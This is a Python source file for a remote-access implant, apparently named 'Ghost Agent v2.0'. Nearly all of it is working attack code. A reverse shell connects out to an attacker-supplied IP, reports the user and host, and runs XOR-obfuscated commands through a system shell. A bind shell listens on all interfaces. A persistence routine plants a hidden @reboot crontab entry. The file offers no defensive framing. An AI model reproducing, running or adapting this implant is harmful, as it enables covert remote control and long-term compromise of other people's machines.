import sys
import socket
import subprocess
import os
import threading
import platform
import argparse
import time

# --- CONFIGURATION ---
VERSION = "2.0-ProtoFix"
DEFAULT_PORT = 4444
XOR_KEY = b"GHOST" 

def print_banner():
    print(r'''
       __ _ _404_ _ 
      / _` |/ _` |/ _ \'_ \| __|
     | (_| | (_| |  __/ | | | |_
      \__,_|\__, |\___|_| |_|\__|
             __/ |               
            |___/   [Agent v''' + VERSION + r''']
    ''')

# --- UTILITIES ---

def get_username():
    """Robustly retrieve username."""
    try:
        return os.getlogin()
    except Exception:
        pass
    return os.environ.get('USER') or os.environ.get('USERNAME') or "unknown"

def xor_cipher(data):
    """Stateless XOR encryption."""
    if not data: return b""
    return bytes([b ^ XOR_KEY[i % len(XOR_KEY)] for i, b in enumerate(data)])

def execute_command(cmd):
    """Executes system commands."""
    cmd = cmd.strip()
    if not cmd: return b""
    
    if cmd.startswith("cd "):
        try:
            target_dir = cmd[3:].strip()
            os.chdir(target_dir)
            return f"Changed directory to {os.getcwd()}".encode()
        except Exception as e:
            return str(e).encode()
            
    try:
        # Use shell=True for flexibility
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output
    except Exception as e:
        output = str(e).encode()
    return output

# --- MODULES ---

def reverse_shell(ip, port):
    while True:
        print(f"[*] Connecting to {ip}:{port}...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((ip, port))
            s.settimeout(None)
            print("[+] Connected!")
            
            # V2: Send Handshake in CLEARTEXT first to verify connection
            user = get_username()
            s.send(f"HELLO_GHOST_V2:{user}@{socket.gethostname()}\n".encode())
            
            while True:
                data = s.recv(4096)
                if not data: break
                
                # Decrypt
                try:
                    decoded = xor_cipher(data)
                    cmd = decoded.decode(errors='ignore').strip()
                    # print(f"DEBUG_CMD: {cmd}")
                except Exception as e:
                    print(f"Decrypt Error: {e}")
                    continue

                if cmd.lower() in ['exit', 'quit']:
                    s.close()
                    return

                # Execute
                output = execute_command(cmd)
                
                # Encrypt Response
                s.send(xor_cipher(output + b"\nMARKER")) # Add marker to help client split stream
                
            s.close()
        except KeyboardInterrupt:
            print("\n[!] Stopped by user.")
            break
        except Exception as e:
            print(f"[!] Error: {e}. Retry in 5s...")
            time.sleep(5)

def bind_shell(port):
    """Listens for incoming connections."""
    def handle_client(client_socket):
        try:
            # V2: Cleartext Banner
            client_socket.send(b"GHOST_BIND_V2_READY\n")
            while True:
                data = client_socket.recv(4096)
                if not data: break
                
                decoded = xor_cipher(data)
                cmd = decoded.decode(errors='ignore').strip()
                # print(f"DEBUG_CMD_RECV: {cmd}")
                
                if cmd.lower() in ['exit', 'quit']: break
                
                output = execute_command(cmd)
                client_socket.send(xor_cipher(output + b"\nMARKER"))
        except:
            pass
        finally:
            client_socket.close()

    server = None
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0", port))
        server.listen(1)
        server.settimeout(1.0)
        print(f"[*] Listening on {port}...")
        
        while True:
            try:
                client, addr = server.accept()
                print(f"[+] Client: {addr}")
                threading.Thread(target=handle_client, args=(client,), daemon=True).start()
            except socket.timeout: continue
            except Exception as e: print(e)
    except KeyboardInterrupt:
        print("\nExit.")
    finally:
        if server: server.close()

def audit_system():
    print("--- SYSTEM AUDIT ---")
    print(f"OS: {platform.system()} {platform.release()}")
    try:
        print(f"User: {get_username()}")
    except:
        pass

def persist_access(payload):
    """Adds a stealth cron job."""
    try:
        current_script = os.path.abspath(sys.argv[0])
        python_exe = sys.executable
        
        # STEALTH: Redirect output to /dev/null
        entry = f"@reboot {python_exe} {current_script} {payload} >/dev/null 2>&1\n"
        
        print(f"[*] Payload configured: {entry.strip()}")

        try:
            current_cron = subprocess.check_output("crontab -l", shell=True, stderr=subprocess.DEVNULL).decode()
        except:
            current_cron = ""

        if current_script in current_cron:
            print("[!] Persistence already appears to exist for this script.")
            return

        new_cron = current_cron + entry
        tmp_cron_file = "/tmp/cron.tmp"
        
        with open(tmp_cron_file, "w") as f:
            f.write(new_cron)
        
        os.system(f"crontab {tmp_cron_file}")
        os.remove(tmp_cron_file)
        
        print(f"[+] Persistence established via Crontab (Stealth Mode)!")
        
    except Exception as e:
        print(f"[!] Persistence failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(dest="command")
    
    rev = subparsers.add_parser("connect")
    rev.add_argument("ip")
    rev.add_argument("--port", type=int, default=4444)
    
    bind = subparsers.add_parser("listen")
    bind.add_argument("--port", type=int, default=4444)
    
    subparsers.add_parser("audit")
    
    persist_parser = subparsers.add_parser("persist")
    persist_parser.add_argument("payload")
    
    args = parser.parse_args()
    print_banner()
    
    if args.command == "connect":
        reverse_shell(args.ip, args.port)
    elif args.command == "listen":
        bind_shell(args.port)
    elif args.command == "audit":
        audit_system()
    elif args.command == "persist":
        persist_access(args.payload)
    else:
        parser.print_help()